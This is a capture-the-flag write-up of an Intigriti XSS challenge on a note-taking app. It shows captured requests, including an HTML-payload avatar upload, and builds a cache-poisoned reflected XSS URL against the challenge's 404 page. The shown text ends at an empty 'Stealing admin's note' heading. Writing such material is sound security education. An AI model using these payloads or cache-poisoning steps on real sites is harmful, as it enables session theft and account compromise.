<p>Intigriti has been putting amazing xss challenges lately,I have been having a hard time in completely solving them but stil I am able to learn a lot from this challenges thanks to the author escpecially.</p>

<p>This month was no exception, this month’s xss challenge was created by @H4R3L (he found a very interesting xss bug in glassdoor  https://nokline.github.io/bugbounty/2022/09/02/Glassdoor-Cache-Poisoning.html) make sure to read if you haven’t already.</p>

<p>https://twitter.com/intigriti/status/1597209905903149060?s=20&amp;t=G9vZKRi4jTgnJPB_JetsfQ</p>

<p>The challenge type was a bit different then you normally see in other intigriti xss challenge.</p>

<p>Here’s the solution video: https://twitter.com/intigriti/status/1599556700901720066?s=20&amp;t=cLISRgUqpEVoOlFY5thZrA</p>

<p>I didn’t completed this challenge  the last part I wasn’t able to solve how (avatar path),so my writeup is based on the video solution for that part only.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Rules:
This challenge runs from the 28th of November until the 4th of December, 11:59 PM CET.
Out of all correct submissions, we will draw six winners on Monday, the 5th of December:
Three randomly drawn correct submissions
Three best write-ups
Every winner gets a €50 swag voucher for our swag shop
The winners will be announced on our Twitter profile.
For every 100 likes, we'll add a tip to announcement tweet.
Join our Discord to discuss the challenge!
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The solution...
Should steal the flag from the admin user. The admin user has a note with more info on the flag.
The flag format is INTIGRITI{.*}.
Should NOT use another challenge on the intigriti.io domain.
Should be reported at go.intigriti.com/submit-solution.
</code></pre></div></div>

<p>The task of this challenge is to steal the flag from the admin user, the challenge site is basically a note taking application so the flag is in admin’s note.</p>

<p><em>Test your payloads down below and on the challenge page here! Think you have the right solution? Send your payload to “https://api.challenge-1122.intigriti.io/admin?url=” to have an admin check it immediately! Do not spam this endpoint. Doing so will result in a ban.</em></p>

<p>Any url provided to this endpoint will be visited by the admin user (such challenges ae pretty common in ctfs, where you need to find a xss bug and then steal something from the admin’s acc)
https://api.challenge-1122.intigriti.io/admin?url=</p>

<hr />

<p>The signup page 
<img src="https://user-images.githubusercontent.com/31372554/205580721-fcae8e54-ef3a-4520-85fe-d111ff5c2fa1.png" alt="firefox_5pIzYwQemJ" /></p>

<p>The username is automatically filled which is randomly generated using output from fakerjs
Just hit on signup and login to view other section of the website</p>

<p><img src="https://user-images.githubusercontent.com/31372554/205580702-ef9a4ee1-855d-4cea-9e77-cb8557d231dc.png" alt="firefox_kLgOmNT4g4" /></p>

<p>The authentication is based upon jwt.</p>

<p>On the left corner you can see there options to create  a new note</p>

<p><img src="https://user-images.githubusercontent.com/31372554/205580682-3b4aa73d-1e6d-4c7a-8bf6-6402e1614b00.png" alt="firefox_6juWcTQMYB" /></p>

<p>Hitting on submit button will create the note.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /api/notes HTTP/2
Host: api.challenge-1122.intigriti.io
Cookie: _ga=GA1.2.2123064541.1629122479
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://api.challenge-1122.intigriti.io/
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiZDIyMzExMTMtNDBmNy00ZmQzLTlmZjctN2JlNTAzMTFiNWQyIiwidXNlcm5hbWUiOiJibHVldG9vdGgtamF6ejk0Nzk2MzU0IiwiaWF0IjoxNjcwMjE3Nzc2LCJleHAiOjE2NzAzMDQxNzZ9.Cd37krh_2ntj0YXD2z4LqeX578G5f5DD7F_z0SqssqA
Content-Length: 56
Origin: https://api.challenge-1122.intigriti.io
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{
  "title": "xxx\"&gt;&lt;img src=x&gt;",
  "note": "xxx\"&gt;&lt;img src=x&gt;"
}
</code></pre></div></div>

<p>Response</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"success"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
  </span><span class="nl">"reference"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://cdn.challenge-1122.intigriti.io/uploads/note-bluetooth-jazz94796354-13b9aa3a-dee8-4811-bfd5-2e71fda297c1.html"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"uuid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"13b9aa3a-dee8-4811-bfd5-2e71fda297c1"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"owner"</span><span class="p">:</span><span class="w"> </span><span class="s2">"bluetooth-jazz94796354"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"title"</span><span class="p">:</span><span class="w"> </span><span class="s2">"xxx</span><span class="se">\"</span><span class="s2">&amp;gt;"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>I will explain later what the <code class="language-plaintext highlighter-rouge">reference</code> parameter url is used for.</p>

<p>The note title and content appears something like this on the page, the html tags didn’t get rendered so that means there was some sanitization in place or something.</p>

<p><img src="https://user-images.githubusercontent.com/31372554/205580640-1a6cd4a5-4f55-4010-beb0-9d5e03f3d6f7.png" alt="firefox_GbRqONtTwh" /></p>

<p>As we now have a basic understanding of the application let’s focus on the api endpoints and js code.</p>

<p><img src="https://user-images.githubusercontent.com/31372554/205580620-c55c30a0-033b-4da4-8727-2f3615989e8d.png" alt="firefox_Lv4JNvsLe4" /></p>

<p>The note contents are actually stored in .html file in a different subdomain cdn.challenge-1122.intigriti.io, from the <code class="language-plaintext highlighter-rouge">/api/notes</code> endpoint response the <code class="language-plaintext highlighter-rouge">reference</code> key denotes the location where the note contents were saved.</p>

<p>If you visit this url, you can view the note content:</p>

<p>https://cdn.challenge-1122.intigriti.io/uploads/note-bluetooth-jazz94796354-13b9aa3a-dee8-4811-bfd5-2e71fda297c1.html</p>

<p>The note content is properly seems to santized , this note cdn url is embedded in an iframe on the main site as you can see in the above screenshot and highlighted areas.</p>

<hr />

<h1 id="js-code">JS code</h1>

<p>Looking at the js code now:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">staging.challenge-1122.intigriti.io</span><span class="dl">"</span><span class="p">){</span> <span class="c1">// [1]</span>
        		<span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">You are in the staging environment</span><span class="dl">"</span><span class="p">)</span>
        	<span class="p">}</span>

        	<span class="kd">function</span> <span class="nf">addNote</span><span class="p">(</span><span class="nx">uuid</span><span class="p">,</span> <span class="nx">title</span><span class="p">,</span> <span class="nx">reference</span><span class="p">){</span>
        		<span class="kd">let</span> <span class="nx">note_list_content</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">note-list-content</span><span class="dl">"</span><span class="p">)</span>
        		<span class="kd">let</span> <span class="nx">note_list</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">note-list</span><span class="dl">"</span><span class="p">)</span>

				<span class="kd">let</span> <span class="nx">h3title</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">h3</span><span class="dl">"</span><span class="p">)</span>
				<span class="nx">h3title</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">title</span> <span class="c1">// [2]</span>

				<span class="kd">let</span> <span class="nx">frame</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">)</span>
				<span class="nx">frame</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">reference</span>  <span class="c1">// [3]</span>
				
				<span class="kd">let</span> <span class="nx">div</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">div</span><span class="dl">"</span><span class="p">)</span>
				<span class="nx">div</span><span class="p">.</span><span class="nx">id</span> <span class="o">=</span> <span class="nx">uuid</span>
				<span class="nx">div</span><span class="p">.</span><span class="nx">classList</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">tabcontent</span><span class="dl">"</span>
				<span class="nx">div</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">h3title</span><span class="p">)</span>
				<span class="nx">div</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">frame</span><span class="p">)</span>
        		
        		<span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">a</span><span class="dl">"</span><span class="p">)</span>
        		<span class="nx">a</span><span class="p">.</span><span class="nx">onclick</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="nf">getNote</span><span class="p">(</span><span class="nx">uuid</span><span class="p">)</span>
        		<span class="nx">a</span><span class="p">.</span><span class="nx">classList</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">tablinks list-group-item bg-dark text-white list-group-item-action list-group-item-light p-3</span><span class="dl">"</span>
        		<span class="nx">a</span><span class="p">.</span><span class="nx">text</span> <span class="o">=</span> <span class="s2">`[*] </span><span class="p">${</span><span class="nx">title</span><span class="p">}</span><span class="s2">`</span>

        		<span class="nx">note_list_content</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">div</span><span class="p">)</span>
        		<span class="nx">note_list</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span>
        		
        	<span class="p">}</span>
        	
        	
	        <span class="kd">let</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">localStorage</span><span class="p">[</span><span class="dl">'</span><span class="s1">jwt</span><span class="dl">'</span><span class="p">];</span>
	        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">jwt</span><span class="p">){</span>
	        	<span class="nx">location</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">/signup</span><span class="dl">'</span>
	        <span class="p">}</span> <span class="k">else</span><span class="p">{</span>
	        	<span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/user/me</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span> 
	        		<span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
	        			<span class="dl">'</span><span class="s1">Authorization</span><span class="dl">'</span><span class="p">:</span> <span class="s2">`Bearer </span><span class="p">${</span><span class="nx">jwt</span><span class="p">}</span><span class="s2">`</span>
	        		<span class="p">}</span> 
	        	<span class="p">})</span>
	        	<span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">r</span> <span class="o">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nf">json</span><span class="p">())</span>
	        	<span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">r</span> <span class="o">=&gt;</span> <span class="p">{</span>
	        		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">r</span><span class="p">.</span><span class="nx">success</span><span class="p">){</span>
	        			<span class="nx">location</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">/signup</span><span class="dl">'</span>
	        		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
	        			<span class="kd">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">r</span><span class="p">.</span><span class="nx">username</span>
	        			<span class="kd">const</span> <span class="nx">avatarPath</span> <span class="o">=</span> <span class="nx">r</span><span class="p">.</span><span class="nx">avatarPath</span>
	        			<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByClassName</span><span class="p">(</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">username</span><span class="p">;</span>
	        			<span class="k">if</span><span class="p">(</span><span class="nx">avatarPath</span><span class="p">){</span>
	        				<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByClassName</span><span class="p">(</span><span class="dl">"</span><span class="s2">avatar</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">avatarPath</span><span class="p">;</span>
	        			<span class="p">}</span>
	        		<span class="p">}</span>
	        		
	        	<span class="p">})</span>
	        <span class="p">}</span>
	        <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/notes</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
	        	<span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
	        		<span class="dl">'</span><span class="s1">Authorization</span><span class="dl">'</span><span class="p">:</span> <span class="s2">`Bearer </span><span class="p">${</span><span class="nx">jwt</span><span class="p">}</span><span class="s2">`</span><span class="p">,</span>
	        		<span class="dl">'</span><span class="s1">Accept</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span>
	        	<span class="p">}</span>
	        <span class="p">})</span>
	        <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">r</span> <span class="o">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nf">json</span><span class="p">())</span>
	        <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">r</span> <span class="o">=&gt;</span> <span class="p">{</span>
	        	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">r</span><span class="p">){</span>
	        		<span class="k">return</span> <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Something went wrong</span><span class="dl">"</span><span class="p">)</span>
	        	<span class="p">}</span>
	        	<span class="nx">r</span><span class="p">.</span><span class="nf">forEach</span><span class="p">((</span><span class="nx">n</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
	        		<span class="kd">let</span> <span class="p">{</span> <span class="nx">title</span><span class="p">,</span> <span class="nx">uuid</span><span class="p">,</span> <span class="nx">reference</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">n</span>
	        		<span class="nf">addNote</span><span class="p">(</span><span class="nx">uuid</span><span class="p">,</span><span class="nx">title</span><span class="p">,</span><span class="nx">reference</span><span class="p">)</span>
	        	<span class="p">})</span>
	        <span class="p">})</span>
</code></pre></div></div>

<p>From line [1], we got to know about another subdomain staging.challenge-1122.intigriti.io. After that there is a method <code class="language-plaintext highlighter-rouge">addNote</code> which as the name suggests adds the note to the pages dom.
On line [2], the note’s title is passed to the <code class="language-plaintext highlighter-rouge">h3title.textContent</code> (if it would have been innerHTML then xss would have been there but this is safe from xss)
On line [3] you can it directly puts the <code class="language-plaintext highlighter-rouge">refrence</code> key in the iframe src attribute which I have already shown in the screenshot.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kd">let</span> <span class="nx">file_upload</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByClassName</span><span class="p">(</span><span class="dl">"</span><span class="s2">file-upload</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
		<span class="nx">file_upload</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">change</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
			<span class="kd">let</span> <span class="nx">formData</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FormData</span><span class="p">();</span>
			<span class="nx">formData</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="dl">"</span><span class="s2">avatar</span><span class="dl">"</span><span class="p">,</span> <span class="nx">file_upload</span><span class="p">.</span><span class="nx">files</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
			<span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/user/avatar</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
				<span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
				<span class="na">headers</span><span class="p">:</span> <span class="p">{</span> 
					<span class="dl">'</span><span class="s1">Accept</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span><span class="p">,</span> 
					<span class="dl">'</span><span class="s1">Authorization</span><span class="dl">'</span><span class="p">:</span> <span class="s2">`Bearer </span><span class="p">${</span><span class="nx">jwt</span><span class="p">}</span><span class="s2">`</span> 
				<span class="p">},</span>
				<span class="na">body</span><span class="p">:</span> <span class="nx">formData</span>
			<span class="p">})</span>
			<span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">r</span><span class="o">=&gt;</span><span class="nx">r</span><span class="p">.</span><span class="nf">json</span><span class="p">())</span>
			<span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">r</span> <span class="o">=&gt;</span> <span class="p">{</span>
				<span class="kd">let</span> <span class="nx">avatar</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByClassName</span><span class="p">(</span><span class="dl">"</span><span class="s2">avatar</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
				<span class="nx">avatar</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">r</span><span class="p">.</span><span class="nx">avatarPath</span><span class="p">;</span> 
			<span class="p">})</span>
		<span class="p">})</span>
		
		<span class="kd">let</span> <span class="nx">note_submit</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">note-submit</span><span class="dl">"</span><span class="p">);</span>
		<span class="kd">function</span> <span class="nf">submitNote</span><span class="p">()</span> <span class="p">{</span> 
			<span class="kd">let</span> <span class="nx">title</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">note-title</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span> 
			<span class="kd">let</span> <span class="nx">note</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">note-body</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span> 
			<span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/notes</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span> 
				<span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> 
				<span class="na">headers</span><span class="p">:</span> <span class="p">{</span> 
					<span class="dl">'</span><span class="s1">Accept</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span><span class="p">,</span> 
					<span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span><span class="p">,</span> 
					<span class="dl">'</span><span class="s1">Authorization</span><span class="dl">'</span><span class="p">:</span> <span class="s2">`Bearer </span><span class="p">${</span><span class="nx">jwt</span><span class="p">}</span><span class="s2">`</span> 

				<span class="p">},</span> 
				<span class="na">body</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">({</span> 
					<span class="na">title</span><span class="p">:</span> <span class="nx">title</span><span class="p">,</span> 
					<span class="na">note</span><span class="p">:</span> <span class="nx">note</span> 
				<span class="p">})</span> 
			<span class="p">})</span> 
			<span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">r</span> <span class="o">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nf">json</span><span class="p">())</span> 
			<span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">r</span> <span class="o">=&gt;</span> <span class="p">{</span> 
				<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">r</span> <span class="o">||</span> <span class="o">!</span><span class="nx">r</span><span class="p">.</span><span class="nx">success</span><span class="p">){</span>
					<span class="k">return</span> <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Something went wrong</span><span class="dl">"</span><span class="p">)</span>
				<span class="p">}</span>
				<span class="nf">addNote</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">uuid</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">title</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">reference</span><span class="p">)</span>
			<span class="p">})</span> 
		<span class="p">}</span>
</code></pre></div></div>

<p>From this part of the code we come to realize that there is a file upload funcionality , you can change your avatar by clicking on your profile icon.</p>

<p><img src="https://user-images.githubusercontent.com/31372554/205580580-85fbb816-d0c6-49f0-bce7-c7a7411b5006.png" alt="firefox_2cCxmcYzSS" /></p>

<p>The avatar is also uploaded on the cdn domain,eg url https://cdn.challenge-1122.intigriti.io/uploads/avatar-bluetooth-jazz94796354.png</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /api/user/avatar HTTP/2
Host: api.challenge-1122.intigriti.io
Cookie: _ga=GA1.2.2123064541.1629122479
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://api.challenge-1122.intigriti.io/
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiZDIyMzExMTMtNDBmNy00ZmQzLTlmZjctN2JlNTAzMTFiNWQyIiwidXNlcm5hbWUiOiJibHVldG9vdGgtamF6ejk0Nzk2MzU0IiwiaWF0IjoxNjcwMjE3Nzc2LCJleHAiOjE2NzAzMDQxNzZ9.Cd37krh_2ntj0YXD2z4LqeX578G5f5DD7F_z0SqssqA
Content-Type: multipart/form-data; boundary=---------------------------1514786326898924171509647265
Content-Length: 7329
Origin: https://api.challenge-1122.intigriti.io
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

-----------------------------1514786326898924171509647265
Content-Disposition: form-data; name="avatar"; filename="3r5bLuud.png"
Content-Type: image/png

test&lt;img src=x&gt;
-----------------------------1514786326898924171509647265--

</code></pre></div></div>

<p>The validation is pretty relax so it accepts any extenions, leave the <code class="language-plaintext highlighter-rouge">Content-Type: image/png</code> as it is or else it will return image not valid error.</p>

<p>By changing the <code class="language-plaintext highlighter-rouge">filename</code> parameter to <code class="language-plaintext highlighter-rouge">html</code> we can achieve xss here (that’s what I though at first)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----------------------------1514786326898924171509647265
Content-Disposition: form-data; name="avatar"; filename="test.html"
Content-Type: image/png

test&lt;img src=x onerror=alert()&gt;
-----------------------------1514786326898924171509647265--
</code></pre></div></div>

<p>Response:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"success"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
  </span><span class="nl">"avatarPath"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://cdn.challenge-1122.intigriti.io/uploads/avatar-bluetooth-jazz94796354.html"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Visiting the <code class="language-plaintext highlighter-rouge">avatarPath</code> url https://cdn.challenge-1122.intigriti.io/uploads/avatar-bluetooth-jazz94796354.html
Renderes the image tag but no xss popup :(</p>

<p>CSP Violation..
<img src="https://user-images.githubusercontent.com/31372554/205580557-46c70adf-c555-4a35-a31b-8bcd193c615b.png" alt="firefox_RI5d7MZIzl" /></p>

<p>Checking the csp on https://csp-evaluator.withgoogle.com/ , yield no findings . The policy pretty strict so no xss
<img src="https://user-images.githubusercontent.com/31372554/205580541-eb11c62a-9a10-4ca0-89ab-8704d8c9d8ad.png" alt="firefox_VZkOZr7Pym" /></p>

<hr />

<h1 id="404-not-found-page">404 Not found Page</h1>

<p>If you visit a url on the /upload endpoint which doesn’t exists it returns a custom 404 page which looks old</p>

<p>https://cdn.challenge-1122.intigriti.io/uploads/testxxxxxxxxxxxxxxxxxxxxxxx.html</p>

<p><img src="https://user-images.githubusercontent.com/31372554/205580525-a024e516-1daa-43ff-9fe0-85806a3460cd.png" alt="BurpSuiteCommunity_fvjnFj2EES" /></p>

<p>IN no time you can spot as the path is being reflected in the response without any santization this leads to xss, along with that no csp is there in this endpoint :)
But no visiting this endpoint in browser didn’t showed any popup, the path was url encoded in the response page.</p>

<p><img src="https://user-images.githubusercontent.com/31372554/205580509-29dc5959-b6df-49b9-9931-0349d156523a.png" alt="firefox_AlvE2aik6a" /></p>

<p>This xss is the one which only works in Internet Explorer, all other browsers url encode the path IE is the exception, this really looks like self xss currently like from burp <em>Show response in browser</em> which is not any usefull any where.</p>

<p>Focusing more on the response headers of the 404 page</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/2 200 OK
Date: Mon, 05 Dec 2022 05:49:10 GMT
Content-Type: text/html; charset=utf-8
X-Powered-By: Express
Etag: W/"67-llkugSXLZIgZRBq03M5e+T6gfZE"
X-Varnish: 6525264
Age: 0
Via: 1.1 varnish (Varnish/6.1)
X-Cache: MISS
X-Cache-Hits: 0
</code></pre></div></div>

<p>It seemed caching is enabled for this endpoint, I spent so much time here the <code class="language-plaintext highlighter-rouge">X-Cache</code>  header value never changed to <code class="language-plaintext highlighter-rouge">HIT</code> no matter what extension I try.
Turns out in the <em>Param Miner</em> config both the cache buster were enabled,</p>

<p><img src="https://user-images.githubusercontent.com/31372554/205580496-e64a273d-48c1-40e9-a6a1-146a775b93e6.png" alt="BurpSuiteCommunity_01BCvE076W" /></p>

<p>And I was only focused on the <code class="language-plaintext highlighter-rouge">X-Cache</code>  header and didn;t saw that a new parameter was added to the url which avoided the page to get cached(as everytime a new cachebuster was added to the url).
Disabled  those options and now got the change in response header.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://cdn.challenge-1122.intigriti.io/uploads/testxxxxxxxxxxxxxxxxxxxxxxx.png



HTTP/2 200 OK
Date: Mon, 05 Dec 2022 05:59:43 GMT
Content-Type: text/html; charset=utf-8
X-Powered-By: Express
Etag: W/"4d-KAcasjxe3gWO1IO7lrWp05LJXyY"
X-Varnish: 665576 3848761
Age: 1
Via: 1.1 varnish (Varnish/6.1)
X-Cache: HIT
X-Cache-Hits: 3

&lt;h1&gt;404 :(&lt;/h1&gt;&lt;p&gt;Could not find /uploads/testxxxxxxxxxxxxxxxxxxxxxxx.png&lt;/p&gt;
</code></pre></div></div>

<p>Adding any character after the extension part reult into the page not being cache, so inserted the xss payload in the filename path</p>

<p>ALthough I could put any tags inside it, I can’t use <code class="language-plaintext highlighter-rouge">/</code> neither space which are really necessary in this case</p>

<p>This url returned the express not found page not the custom 404 page so no xss</p>

<p>https://cdn.challenge-1122.intigriti.io/uploads/xxx&lt;img/src=x&gt;shirley.png</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
&lt;meta charset="utf-8"&gt;
&lt;title&gt;Error&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;pre&gt;Cannot GET /uploads/xxx%3Cimg/src=x%3Eshirley.png&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;

</code></pre></div></div>

<p>Even if I used encoded values like %2F %20, they will not be auto decode by the browser so again no xss.</p>

<p>It’s only possible use those restricted characters in the query parameters, so I played around a bit.Btw I was talking to author giving updates about my progress this really helps , the author might no give you hints but still it really helps so don’t hesitate to reach out the author of such challenges they are really nice and open to answer any question you have regarding the challenges.
I told the author that I can’t use those characters which are really needed for xss and that would be only after <code class="language-plaintext highlighter-rouge">?</code>, he replied <em>How does the server actually checks to cache the page or not</em></p>

<p>Then spent time to think about it, all it does it checks for the url if it ends with allowlist extension or not like .jpg,.png,.css</p>

<p>After playing around a bit I found the work around this:</p>

<p>https://cdn.challenge-1122.intigriti.io/uploads/xxx?&lt;img/src=x&gt;shirley.png</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/2 200 OK
Date: Mon, 05 Dec 2022 06:26:12 GMT
Content-Type: text/html; charset=utf-8
X-Powered-By: Express
Etag: W/"48-MDC+d7XBSsp/uSACZQJwS1l34n4"
X-Varnish: 665644 665642
Age: 3
Via: 1.1 varnish (Varnish/6.1)
X-Cache: HIT
X-Cache-Hits: 1

&lt;h1&gt;404 :(&lt;/h1&gt;&lt;p&gt;Could not find /uploads/xxx?&lt;img/src=x&gt;shirley.png&lt;/p&gt;
</code></pre></div></div>

<p>Make a request to this url 2-3 times so that it’s being cached: https://cdn.challenge-1122.intigriti.io/uploads/xxx?&lt;img/src=’x’/onerror=alert()&gt;shirley.png</p>

<p><img src="https://user-images.githubusercontent.com/31372554/205580466-a5960309-e47c-4c24-b235-7e08f2d84fd5.png" alt="firefox_BJNya2NGOr" /></p>

<p>Finally xsss</p>

<hr />

<h1 id="stealing-admins-note">Stealing admin’s note</h1>

